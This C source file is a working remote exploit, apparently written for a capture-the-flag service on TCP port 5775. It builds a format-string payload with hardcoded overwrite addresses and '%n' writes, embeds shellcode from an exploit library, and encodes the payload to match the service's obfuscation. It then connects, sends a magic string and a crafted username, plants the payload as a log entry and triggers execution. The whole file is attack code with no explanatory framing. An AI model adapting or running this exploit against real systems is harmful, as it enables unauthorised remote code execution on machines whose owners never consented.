#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libexploit/libexploit.h>

size_t e_payload_max_size = 32;


void
serialize(char *buf, unsigned int offset) {

	int i;

	for ( i = 0; i < strlen(buf); ++i, offset++ ) {

		buf[i] ^= 43;
		buf[i] += 63;
		buf[i] ^= 88;
		buf[i] -= 77;
		buf[i] ^= 74;
		buf[i] += 27;
		buf[i] -= (char)(2 * offset) % 8;
	}
}

void
unserialize(char *buf, unsigned int offset) {

	int i;

	for ( i = 0; i < strlen(buf); ++i, offset++ ) {
		buf[i] += (char)(2 * offset) % 8;
		buf[i] -= 27;
		buf[i] ^= 74;
		buf[i] += 77;
		buf[i] ^= 88;
		buf[i] -= 63;
		buf[i] ^= 43;
	}
}




char * mangle_string(char *s) {

	int i;
	for ( i = 0; i < strlen(s); ++i ) {
		s[i] += 3 * i;
		s[i] >>= 2;
		s[i] -= 2 * i;
		s[i] *= 4;
	}

	return s;
}

unsigned char mangle_byte(unsigned char byte, int i) {

	unsigned char res;

	res = byte;

	res ^= 43;
	res += 63;
	res ^= 88;
	res -= 77;
	res ^= 74;
	res += 27;
	res -= (char)(2 * i) % 8;

	return res;
}


void
generate_name(char *buf, size_t len) {

	int i;
	for(i=0; i<len; i++) {
		buf[i] = rand();
	}
	buf[i] = '\0';
}


int main(int argc, char *argv[])
{
	if (argc < 2) {
		fprintf(stderr, "Usage: %s host\n", argv[0]);
		return EXIT_FAILURE;
	}
	e_host = argv[1];


	srand(time(0) ^ getpid());

	char name[10] = {0};
	//first write
	//char fmt[64]  = "\xd0\xe6\x04\x08";
	//strcat(fmt, "BBBB%10$n");
	//	0804E6D0


	//shellcode|%123123d|%xhn|%7474d|%yhn|firstword|secondword

// 	struct {
// 		char shellcode[44];
// 		uint32_t addr;
// 		char str[6];
// 	}__attribute__((packed)) fmt;
// 
// 	char * tmp = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK";
// 	memcpy(&fmt.shellcode, tmp, strlen(tmp));
// 	fmt.addr = 0x0804E6D0;
// 	memcpy(&fmt.str, "M%21$n", strlen("M%21$n"));


	//call ebx  @ 0x0804C190 = 134529424
	//flcose ptr @ 0x0804E6D0
	struct {
		char shellcode[44 - 12];
		uint32_t addr;
		char str[6 + 12];
	}__attribute__((packed)) fmt;
	databuf_t *payload;


	char * tmp = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH";
	memset(&fmt.shellcode, '\xcc', strlen(tmp));
	fmt.addr = 0x0804E6D0;
	memcpy(&fmt.str, "__%134529380u%18$n", strlen("__%134529380u%18$n"));

	ex_payload_generate(&payload, NULL);
	memcpy(&fmt.shellcode, payload->data, payload->length);
//	memcpy(&fmt.shellcode, tmp, strlen(tmp));
	


//
//
//	struct {
//		char buf[54];
//	}__attribute__((packed)) fmtX;
//	memcpy(&fmtX, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLM%21$p", strlen("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLM%21$p"));


//	e_hexdump_buf(&fmt, sizeof(fmt));
// 	memset(fmt.shellcode, 0x41, sizeof(fmt.shellcode));
// 	memset(&fmt.addr, 0x42, sizeof(fmt.addr));
	//memcpy(fmt.shellcode, "BBBB%25$n", strlen("BBBB%25$n"));
// 	int i;
// 	for(i=0; i<sizeof(fmt.shellcode); i+=2) {
// 		memcpy(fmt.shellcode + i, "%p", 2);
// 	}
// 	fmt.addr = 0x0804e6d0;

	//generate_name(name, sizeof(name));
	//snprintf(name, sizeof(name), "%s", "name");
	memset(name, 0, sizeof(name));
	name[0] = '\xeb';
	name[1] = '\x05';
	name[2] = '\x05';
	name[3] = '\xEB';
	//memset(name, 0xCC, 4);
	//unserialize(name, 0);
	
	printf("----------------");
	e_hexdump_buf(name, sizeof(name));
	printf("----------------");
	unserialize((char *)&fmt, strlen(name) + strlen(": "));

	exd_net_tcp_connect(e_host, 5775);

	getchar();

	databuf_t *in, *out;
 	ex_databuf_alloc(&in);
 	ex_databuf_alloc(&out);

	exd_io_read_until(in, ">");

	fprintf(stderr, "[+] sending magic\n");
	ex_databuf_append_string(out, "xevgdirkhe");
	exd_io_write_line(out);

	exd_io_read_until(in, ":");

	fprintf(stderr, "[+] sending username\n");
	ex_databuf_clear(out);
	ex_databuf_append_string(out, name);
	exd_io_write_line(out);

	exd_io_read_line(in);
	exd_io_read_until(in, "$");

	fprintf(stderr, "[+] sending write command\n");
	ex_databuf_clear(out);
	ex_databuf_append_string(out, "write");
	exd_io_write_line(out);

	exd_io_read_until(in, ":");
	fprintf(stderr, "[+] writing log entry\n");

	// send format string
	//strcat((char *)&fmt, "\n");
	e_hexdump_buf((char *)&fmt, sizeof(fmt));
	exd_io_write_buf((char *)&fmt, sizeof(fmt));
	exd_io_write_buf("\n", 1);

	exd_io_read_until(in, "$");

	printf("[+] done\n");

	ex_payload_execute();

	return EXIT_SUCCESS;



	ex_databuf_clear(out);
	ex_databuf_append_string(out, "read");
	exd_io_write_line(out);

	fprintf(stderr, "[+] reading logs\n");


	while(1) {
		char res[4096] = {0};
		char *start, *end;

		ex_databuf_clear(in);

		exd_io_read_line(in);


		if (!memcmp(in->data, "eof", strlen("eof"))) {
			fprintf(stderr, "[+] got eof\n");
			break;
		}

		if (memcmp(in->data, name, strlen(name))) {
			fprintf(stderr, "skipping log entry\n");
			continue;
		}

		printf("[+] log entry:\n");

		start = in->data + strlen(name) + strlen(": ");
		end   = in->data + in->length;
		memcpy(res, start, (end-start));

		serialize(res, strlen(name) + strlen(": "));

		fprintf(stderr, "[+] serialize\n");

		e_hexdump_buf(res, strlen(res));

	}

	printf("[+] done\n");

	ex_payload_execute();

	return EXIT_SUCCESS;
}
